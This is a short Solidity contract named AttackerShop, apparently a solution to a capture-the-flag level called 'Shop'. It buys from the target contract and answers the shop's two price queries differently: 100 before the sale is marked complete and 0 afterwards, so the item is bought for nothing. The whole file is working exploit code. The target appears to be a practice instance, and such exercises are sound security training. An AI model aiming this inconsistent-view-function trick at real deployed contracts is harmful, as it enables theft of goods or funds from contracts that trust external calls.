// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/21_Shop.sol";

contract AttackerShop {
    address private _shop;

    function exploit(address shop) public payable {
        _shop = shop;
        Shop(_shop).buy();
    }

    function price() external view returns (uint256) {
        return Shop(_shop).isSold() ? 0 : 100;
    }
}
